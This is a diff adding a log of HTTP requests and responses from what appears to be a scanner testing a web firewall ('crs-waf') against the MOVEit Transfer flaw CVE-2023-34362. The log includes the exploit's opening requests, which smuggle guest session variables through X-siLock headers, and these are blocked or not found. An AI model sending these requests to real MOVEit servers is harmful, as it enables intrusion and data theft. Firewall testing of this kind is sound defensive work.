@@ -1,0 +1,100 @@
+[CVE-2023-34362] Dumped HTTP request for http://crs-waf:8080
+
+
+GET / HTTP/1.1
+Host: crs-waf:8080
+User-Agent: python-requests/2.26.0
+Connection: close
+Cookie: siLockLongTermInstID=0
+Accept-Encoding: gzip
+
+
+[CVE-2023-34362] Dumped HTTP response http://crs-waf:8080
+
+HTTP/1.1 200 OK
+Connection: close
+Content-Length: 45
+Accept-Ranges: bytes
+Content-Type: text/html
+Date: Wed, 01 May 2024 03:10:18 GMT
+Etag: "2d-432a5e4a73a80"
+Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
+Server: Apache/2.4.59 (Unix)
+
+<html><body><h1>It works!</h1></body></html>
+
+[CVE-2023-34362] Dumped HTTP request for http://crs-waf:8080/moveitisapi/moveitisapi.dll?action=m2
+
+
+POST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1
+Host: crs-waf:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40
+Connection: close
+Content-Length: 0
+Ax-silock-transaction: folder_add_by_path
+Cookie: siLockLongTermInstID=0
+X-siLock-SessVar0: MyUsername: Guest
+X-siLock-SessVar1: MyPkgAccessCode: 123
+X-siLock-SessVar2: MyGuestEmailAddr: my_guest_email@example.com
+X-siLock-Transaction: session_setvars
+Accept-Encoding: gzip
+
+
+[CVE-2023-34362] Dumped HTTP response http://crs-waf:8080/moveitisapi/moveitisapi.dll?action=m2
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 199
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 01 May 2024 03:10:18 GMT
+Server: Apache
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this resource.</p>
+</body></html>
+
+[CVE-2023-34362] Dumped HTTP request for http://crs-waf:8080/guestaccess.aspx
+
+
+POST /guestaccess.aspx HTTP/1.1
+Host: crs-waf:8080
+User-Agent: python-requests/2.26.0
+Connection: close
+Content-Length: 9
+Accept: */*
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Cookie: siLockLongTermInstID=0
+
+Arg06=123
+[CVE-2023-34362] Dumped HTTP response http://crs-waf:8080/guestaccess.aspx
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 196
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 01 May 2024 03:10:19 GMT
+Server: Apache
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>
+
+[CVE-2023-34362] Dumped HTTP request for https://checkip.amazonaws.com:8080
+
+
+GET / HTTP/1.1
+Host: checkip.amazonaws.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Connection: close
+Accept-Encoding: gzip
+
+
